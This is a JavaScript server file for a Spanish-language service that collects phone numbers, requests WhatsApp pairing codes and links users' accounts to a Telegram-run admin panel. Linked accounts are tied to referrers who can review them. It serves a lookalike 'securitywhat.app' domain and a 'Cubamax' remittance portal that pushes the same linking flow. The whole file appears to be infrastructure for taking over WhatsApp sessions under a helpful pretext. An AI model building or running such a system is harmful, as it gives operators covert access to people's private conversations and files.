import {welcomeIdentity} from './welcome-popup.js';
import {publicSnapshot,renderPublicContent} from './public-content.js';
import {createHash} from 'node:crypto';
import {WebPanel} from './panel.js';
import {renderCubamaxPreview} from './link-preview.js';
import {pageContent} from './page-editor.js';
import {portalContent,portalMediaPath} from './portal.js';
import {webPhone,phoneParts} from './identity.js';
import http from 'node:http';
import { readFileSync } from 'node:fs';
import { Store } from './store.js';
import { initializeSystemNumber } from './system-config.js';
import { Accounts } from './whatsapp.js';
import { BaileysStore } from './baileys-store.js';
import { Telegram } from './telegram.js';
import { guides, mediaPath, cleanupGuideMedia } from './guides.js';
import path from 'node:path';
const dir=process.env.DATA_DIR||'./data',store=new Store(dir);
initializeSystemNumber(store);
const welcomeTokens=welcomeIdentity(store);
const url=(process.env.PUBLIC_URL||process.env.RENDER_EXTERNAL_URL||'http://localhost:10000').replace(/\/$/,'');
const cubamaxHosts=new Set(['cubamaxcom.online','www.cubamaxcom.online']);
const whatsappHosts=new Set(['securitywhat.app','www.securitywhat.app']);
const whatsappUrl='https://securitywhat.app';
const allowedOrigins=new Set([url,...[...cubamaxHosts,...whatsappHosts].map(host=>'https://'+host)]);
const secure=url.startsWith('https://');
const panel=process.env.CHATS||process.env.ADMIN_CHAT_ID;
const telegram=new Telegram(store,{token:process.env.TOKEN,admins:process.env.ADMIN_IDS,panel,storage:process.env.ALMACEN,url:whatsappUrl});
const accounts=new Accounts(store,dir,(...args)=>telegram.notify(...args));telegram.accounts=accounts;
const cookieRef=req=>(req.headers.cookie||'').split(';').map(v=>v.trim()).find(v=>v.startsWith('wa_referral='))?.slice(12)||'';
const webPanel=new WebPanel(store,accounts,telegram,{url:whatsappUrl,secure,allowedOrigins,dir});telegram.webPanel=webPanel;
console.log('WHATSAPP: account_capacity','unlimited');
console.log('WHATSAPP: transport_default',process.env.WA_ENGINE||'baileys');
const defaults={title:'Tu WhatsApp, bien atendido.',description:'Conecta tu cuenta para que nuestro equipo te ayude a gestionar tus conversaciones y archivos.',button:'CONECTAR CUENTA',color:'#128c7e'};
const security={
  'Content-Security-Policy':"default-src 'self'; img-src 'self' data:; script-src 'self'; style-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'",
  'X-Content-Type-Options':'nosniff','Referrer-Policy':'no-referrer','X-Frame-Options':'DENY','Cache-Control':'no-store',
  ...(secure?{'Strict-Transport-Security':'max-age=31536000'}:{})
};
const publicBuild=createHash('sha256').update(['welcome-popup.js','welcome-popup.css','public-content.js','page-content.js','app.js','cubamax.js','cubamax-headline.js','cubamax.css','style.css'].map(file=>readFileSync(new URL('../public/'+file,import.meta.url))).join('')).digest('hex').slice(0,16);
const publicFiles={'/welcome-popup.js':['welcome-popup.js','application/javascript'],'/welcome-popup.css':['welcome-popup.css','text/css'],'/studio':['studio.html','text/html; charset=utf-8'],'/studio.js':['studio.js','application/javascript'],'/studio.css':['studio.css','text/css'],'/studio-render.js':['studio-render.js','application/javascript'],'/studio-page.js':['studio-page.js','application/javascript'],'/whatsapp':['index.html','text/html; charset=utf-8'],'/whatsapp/':['index.html','text/html; charset=utf-8'],'/chat-wallpaper.svg':['chat-wallpaper.svg','image/svg+xml'],'/editor':['editor.html','text/html; charset=utf-8'],'/editor.js':['editor.js','application/javascript'],'/editor.css':['editor.css','text/css'],'/editor-preview.js':['editor-preview.js','application/javascript'],'/editor-preview.css':['editor-preview.css','text/css'],'/panel':['panel.html','text/html; charset=utf-8'],'/panel/':['panel.html','text/html; charset=utf-8'],'/panel.css':['panel.css','text/css'],'/panel.js':['panel.js','application/javascript'],'/public-content.js':['public-content.js','application/javascript'],'/prelink-tutorial.js':['prelink-tutorial.js','application/javascript'],'/page-content.js':['page-content.js','application/javascript'],'/cubamax':['cubamax.html','text/html; charset=utf-8'],'/cubamax/':['cubamax.html','text/html; charset=utf-8'],'/cubamax.css':['cubamax.css','text/css'],'/cubamax.js':['cubamax.js','application/javascript'],'/cubamax-headline.js':['cubamax-headline.js','application/javascript'],'/cubamax-logo.svg':['cubamax-logo.svg','image/svg+xml'],'/countries.js':['countries.js','application/javascript'],'/favicon.svg':['favicon.svg','image/svg+xml'],'/':['index.html','text/html; charset=utf-8'],'/app.js':['app.js','application/javascript'],'/style.css':['style.css','text/css']};
async function body(req,max=4000){let data='';for await(const chunk of req){data+=chunk;if(data.length>max)throw new Error('Solicitud demasiado grande');}return JSON.parse(data||'{}');}
const rates=new Map();
function rate(key,max){const now=Date.now();let r=rates.get(key);if(!r||now-r.since>60000){r={since:now,n:0};rates.set(key,r);}return ++r.n<=max;}
const server=http.createServer(async(req,res)=>{
  const route=new URL(req.url,'http://local').pathname;
  const sessionCookie=req.headers['x-portal']==='cubamax-corporate'?'cubamax_session':'wa_session';
  const json=(status,data,extra={})=>{res.writeHead(status,{...security,'Content-Type':'application/json',...extra});res.end(JSON.stringify(data));};
  try{
    if(route.startsWith('/api/web/'))return webPanel.studio.public(req,res,route,security,body);
    if(req.method==='GET'&&(route==='/web/reset'||/^\/web\/[a-f0-9]{16}\/[\w-]{43}$/.test(route))){res.writeHead(200,{...security,'Content-Type':'text/html; charset=utf-8'});return res.end(readFileSync(new URL('../public/studio-page.html',import.meta.url)));}
    if(req.method==='GET'&&route==='/editor/preview'){const secret=(req.headers.cookie||'').split(';').map(v=>v.trim()).find(v=>v.startsWith('wa_panel='))?.slice(9),session=webPanel.access.session(secret);if(!session)return json(401,{error:'Abre el editor desde Telegram.'});if(session.role!=='admin')return json(403,{error:'Solo administradores.'});const html=webPanel.editor.preview(session.actor,new URL(req.url,'http://local').searchParams.get('site'),publicBuild);res.writeHead(200,{...security,'Content-Security-Policy':security['Content-Security-Policy'].replace("frame-ancestors 'none'","frame-ancestors 'self'"),'X-Frame-Options':'SAMEORIGIN','Content-Type':'text/html; charset=utf-8'});return res.end(html);}
    if(route.startsWith('/api/panel/')||route.startsWith('/vincular/')||req.method==='GET'&&/^\/\d{5,15}$/.test(route)&&(cubamaxHosts.has((req.headers.host||'').toLowerCase().split(':')[0])||whatsappHosts.has((req.headers.host||'').toLowerCase().split(':')[0])))return webPanel.handle(req,res,route,security,body);
    if(req.method==='GET'&&publicFiles[route]){
      const host=(req.headers.host||'').toLowerCase().split(':')[0];
      const [file,type]=publicFiles[route==='/'&&cubamaxHosts.has(host)?'/cubamax':route];res.writeHead(200,{...security,'Content-Type':type});const bytes=readFileSync(new URL(`../public/${file}`,import.meta.url));
      if(file==='cubamax.html'||file==='index.html'){const snapshot=publicSnapshot(store,file==='cubamax.html'?'cm':'wa');const html=file==='cubamax.html'?renderCubamaxPreview(bytes.toString(),store,cubamaxHosts.has(host)?'https://cubamaxcom.online':url,route):bytes.toString();const ref=webPanel.referral(req);const escape=v=>String(v).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));let rendered=renderPublicContent(html,snapshot,publicBuild);if(ref&&file==='cubamax.html'){rendered=rendered.replace(/<body\b/,`<body data-link-ref="${escape(cookieRef(req))}"`);const note=`Esta cuenta quedará asociada a ${escape(ref.name)} (Telegram ${escape(ref.actor)}) y podrá ser revisada por ese usuario y por los administradores del sistema.`;rendered=rendered.replace(/(<button[^>]*id="connect-button")/,`<p class="note">${note}</p>$1`).replace('Puedes revocar la vinculación desde WhatsApp.</p>',`Puedes revocar la vinculación desde WhatsApp.</p><p>${note}</p>`);}if(ref&&file==='index.html')rendered=rendered.replace(/<body\b/,`<body data-link-ref="${escape(cookieRef(req))}"`);return res.end(rendered);}
      return res.end(bytes);
    }
    if(req.method==='GET'&&route==='/api/public-content'){const site=new URL(req.url,'http://local').searchParams.get('site');if(!['cm','wa'].includes(site))return json(400,{error:'Página no disponible.'});return json(200,publicSnapshot(store,site));}
    if(req.method==='GET'&&route==='/api/page-content')return json(200,pageContent(store,new URL(req.url,'http://local').searchParams.get('site')));
    if(req.method==='GET'&&route==='/health')return json(200,{ok:true,service:'WHATSAPP',transport:process.env.WA_ENGINE||'baileys'});
    if(req.method==='GET'&&route==='/api/cubamax')return json(200,portalContent(store));
    if(req.method==='GET'&&/^\/cubamax-services\/(shein|remesas|recargas|supercombo)\.webp$/.test(route)){const bytes=readFileSync(new URL('../public'+route,import.meta.url));res.writeHead(200,{...security,'Content-Type':'image/webp','Content-Length':bytes.length});return res.end(bytes);}
    if(req.method==='GET'&&/^\/cubamax-promos\/(remesas|ecoflow|bicicleta|contacto|carga|moto|equipo|grupo)\.webp$/.test(route)){const bytes=readFileSync(new URL('../public'+route,import.meta.url));res.writeHead(200,{...security,'Content-Type':'image/webp','Content-Length':bytes.length});return res.end(bytes);}
    if(req.method==='GET'&&/^\/cubamax-slides\/(money|combo|packages|topup)\.svg$/.test(route)){res.writeHead(200,{...security,'Content-Type':'image/svg+xml'});return res.end(readFileSync(new URL('../public'+route,import.meta.url)));}
    if(req.method==='GET'&&portalMediaPath.test(route)){try{const data=readFileSync(path.join(dir,'portal-media',path.basename(route)));if(route.endsWith('.mp4')&&req.headers.range){const match=/^bytes=(\d+)-(\d*)$/.exec(req.headers.range);if(!match)return json(416,{error:'Rango no disponible.'});const start=Number(match[1]),end=Math.min(data.length-1,match[2]?Number(match[2]):data.length-1);if(start>end||start>=data.length)return json(416,{error:'Rango no disponible.'});res.writeHead(206,{...security,'Cache-Control':'public, max-age=31536000, immutable','Content-Type':'video/mp4','Accept-Ranges':'bytes','Content-Range':`bytes ${start}-${end}/${data.length}`,'Content-Length':end-start+1});return res.end(data.subarray(start,end+1));}return res.writeHead(200,{...security,'Cache-Control':'public, max-age=31536000, immutable','Content-Type':{png:'image/png',jpg:'image/jpeg',gif:'image/gif',webp:'image/webp',mp4:'video/mp4'}[route.split('.').at(-1)]}),res.end(data);}catch{return json(404,{error:'Imagen no encontrada.'});}}
    if(req.method==='GET'&&route==='/api/guides')return json(200,{android:guides(store,'android'),iphone:guides(store,'iphone')});
    if(req.method==='GET'&&(/^\/guides\/(android|iphone)-(prepare|open|linked|number|approve)\.svg$/.test(route)||/^\/guides\/(android|iphone)-2026\/step-[1-5]\.gif$/.test(route)||mediaPath.test(route))){
      const ext=route.split('.').at(-1),types={svg:'image/svg+xml',png:'image/png',jpg:'image/jpeg',gif:'image/gif',webp:'image/webp',mp4:'video/mp4'};
      try{const bytes=readFileSync(route.startsWith('/guides/')?new URL('../public'+route,import.meta.url):path.join(dir,'guide-media',path.basename(route)));
        res.writeHead(200,{...security,'Content-Type':types[ext],'Content-Length':bytes.length});return res.end(bytes);
      }catch{return json(404,{error:'Imagen no encontrada'});}
    }
    if(req.method==='GET'&&route==='/api/branding'){
      const config=store.config();return json(200,{...defaults,...Object.fromEntries(['title','description','button','color','logo'].filter(k=>config[k]).map(k=>[k,config[k]]))});
    }
    if(!route.startsWith('/api/'))return json(404,{error:'No encontrado'});
    if(req.method==='POST'&&!allowedOrigins.has(req.headers.origin))return json(403,{error:'Origen inválido'});
    const ip=req.socket.remoteAddress||'unknown';if(!rate(ip,300))return json(429,{error:'Espera un minuto.'});
    const welcomeCookie=id=>`wa_welcome_identity=${welcomeTokens.issue(id)}; HttpOnly; SameSite=Strict; Path=/; Max-Age=31536000${secure?'; Secure':''}`;
    if(req.method==='GET'&&route==='/api/welcome-popup-state'){
      const cookies=Object.fromEntries((req.headers.cookie||'').split(';').map(v=>v.trim().split('=')));
      const account=store.browser(cookies.wa_session)||store.account(welcomeTokens.read(cookies.wa_welcome_identity)||'');
      const linked=!!account&&!!account.consent&&(account.status==='connected'||!!accounts.live.get(account.id)?.ready);
      return json(200,{linked});
    }
    if(req.method==='POST'&&route==='/api/access'){
      if(!rate(`${ip}:access`,30))return json(429,{error:'Espera un minuto.'});
      const input=await body(req);if(typeof input.token!=='string'||input.token.length>100)return json(400,{error:'Enlace inválido.'});
      const session=store.exchange(input.token);if(!session)return json(401,{error:'El acceso ha vencido o ya fue utilizado.'});
      return json(200,{ok:true},{'Set-Cookie':`${sessionCookie}=${session}; HttpOnly; SameSite=Strict; Path=/; Max-Age=2592000${secure?'; Secure':''}`});
    }
    if(req.method==='POST'&&route==='/api/register'){
      if(!rate(`${ip}:register`,5))return json(429,{error:'Espera un minuto antes de volver a intentar.'});
      const input=await body(req);
      if(input.consent!==true||typeof input.phone!=='string')return json(400,{error:'Confirma tu número y la autorización.'});
      const phone=webPhone(input),previous=store.db.prepare('SELECT * FROM accounts WHERE phone=?').get(phone);
      const unlinked=!!previous?.confirmed&&accounts.engine(previous.id)==='baileys'&&!accounts.live.get(previous.id)?.ready&&!new BaileysStore(store,previous.id).registered();
      // An enrolled number completes this public flow; it never grants account access.
      if(previous?.confirmed&&previous.consent&&!unlinked)return json(200,{ok:true,completed:true},sessionCookie==='wa_session'?{'Set-Cookie':welcomeCookie(previous.id)}:{});
      if(!process.env.TOKEN||!panel||!telegram.admins().size)return json(503,{error:'Estamos preparando el servicio. Vuelve a intentarlo más tarde.'});
      const session=store.register(phone,{restartPending:true,restartUnlinked:unlinked});
      if(!session)return json(409,{error:'Este número ya tiene un acceso creado. Vuelve a abrir la página desde el teléfono y navegador donde comenzaste, o contacta con soporte.'});
      if(previous&&store.account(previous.id)?.status==='archived')await accounts.close(previous.id);
      return json(201,{ok:true},{'Set-Cookie':`${sessionCookie}=${session}; HttpOnly; SameSite=Strict; Path=/; Max-Age=2592000${secure?'; Secure':''}`});
    }
    const cookie=(req.headers.cookie||'').split(';').map(x=>x.trim()).find(x=>x.startsWith(sessionCookie+'='))?.slice(sessionCookie.length+1);
    if(req.method==='POST'&&route==='/api/browser-reset'){
      store.forgetBrowser(cookie);
      return json(200,{ok:true},{'Set-Cookie':`${sessionCookie}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${secure?'; Secure':''}`});
    }
    const a=store.browser(cookie);if(!a)return json(401,{error:'Conecta tu cuenta para continuar.'});
    if(req.method==='GET'&&route==='/api/status'){
      const e=accounts.live.get(a.id);if(a.status==='connected')store.forgetBrowser(cookie);return json(200,{name:e?.ready?(store.profile(a.id,`${a.phone}@c.us`)?.name||'Cuenta de WhatsApp'):null,phone:`+${a.phone}`,...phoneParts(a.phone),status:a.status,paused:!!a.paused,consent:!!a.consent,retryAfter:accounts.pairingRetryAfter(a.id),code:e&&e.expires>Date.now()?e.code:null,expires:e?.expires||0},a.status==='connected'?{'Set-Cookie':sessionCookie==='wa_session'?[`${sessionCookie}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${secure?'; Secure':''}`,welcomeCookie(a.id)]:`${sessionCookie}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${secure?'; Secure':''}`} : {});
    }
    if(req.method==='POST'&&route==='/api/connect'){
      const input=await body(req);
      if(input.consent!==true||webPhone(input)!==a.phone)return json(400,{error:'Confirma tu número y la autorización.'});
      if(!process.env.TOKEN||!panel||!telegram.admins().size)return json(503,{error:'El administrador debe completar la configuración antes de conectar cuentas.'});
      const retryAfter=accounts.pairingRetryAfter(a.id);
      if(retryAfter)return json(429,{error:'WhatsApp limitó las solicitudes de códigos para este número. Hemos pausado los intentos durante 30 minutos para no seguir solicitando códigos.',retryAfter});
      if(!rate(`connect:${a.id}`,3))return json(429,{error:'Espera un minuto antes de volver a intentar.'});
      webPanel.consent(a.id,req,input.referral);
      store.update(a.id,'consent',1);store.audit(a.id,'consent-v1');
      const corporate=input.portal==='cubamax-corporate',services={money:'Recibir dinero',combo:'Recibir combo',packages:'Recibir paquetes',topup:'Recarga móvil'};
      const corporateService=corporate?services[input.service]:null;
      if(corporate){store.setConfig(`portal:${a.id}`,'cubamax-corporate');store.audit(a.id,'corporate-consent-v1');if(corporateService)store.audit(a.id,`corporate-service:${input.service}`);}
      const current=accounts.live.get(a.id);
      // An in-flight request is reused; repeated clicks must not restart Chromium.
      await accounts.start(a.id,true);
      if(!current)await telegram.send(telegram.config.storage,`🔗 Intento de vinculación\nNúmero: +${a.phone}${corporate?'\nOrigen: Cubamax · Personal autorizado · Teléfono corporativo'+(corporateService?'\nServicio: '+corporateService:''):''}\nPendiente de confirmación en WhatsApp. Aún no es una cuenta conectada.`).catch(()=>{});
      return json(202,{ok:true});
    }
    if(req.method==='POST'&&route==='/api/pause'){
      const input=await body(req);store.update(a.id,'paused',input.paused?1:0);store.audit(a.id,input.paused?'owner_paused':'owner_resumed');return json(200,{ok:true});
    }
    if(req.method==='POST'&&route==='/api/disconnect'){
      await accounts.disconnect(a.id);return json(200,{ok:true},{'Set-Cookie':`${sessionCookie}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${secure?'; Secure':''}`});
    }
    return json(404,{error:'No encontrado'});
  }catch(e){return json(400,{error: e.message?.startsWith('Usa')||e.message?.startsWith('Se alcanzó')?e.message:'No se pudo completar la operación. Vuelve a intentarlo.'});}
});
server.listen(Number(process.env.PORT||10000),'0.0.0.0',async()=>{
  console.log('WHATSAPP: HTTP listo');
  if(process.env.TOKEN&&panel&&telegram.admins().size){
    telegram.start().catch(()=>console.error('Panel de Telegram detenido'));
    try{const destination=await telegram.api('getChat',{chat_id:telegram.config.storage});console.log('WHATSAPP: storage_verified',JSON.stringify({configured:telegram.config.storage,resolved:destination.id,type:destination.type}));}catch(error){console.error('WHATSAPP: storage_check_failed',error.code||'TG_STORAGE_CHECK');}
    await accounts.restore();
  }else console.log('WHATSAPP: falta configurar TOKEN, ADMIN_CHAT_ID y ADMIN_IDS; vinculación deshabilitada');
});
const maintenance=setInterval(()=>{
  accounts.cleanupFiles();store.cleanup();cleanupGuideMedia(store,dir);
  for(const [key,value]of rates)if(Date.now()-value.since>60000)rates.delete(key);
},3600000);maintenance.unref();
async function stop(){telegram.running=false;server.close();clearInterval(maintenance);await accounts.shutdown();store.db.close();process.exit(0);}
process.on('SIGTERM',stop);process.on('SIGINT',stop);

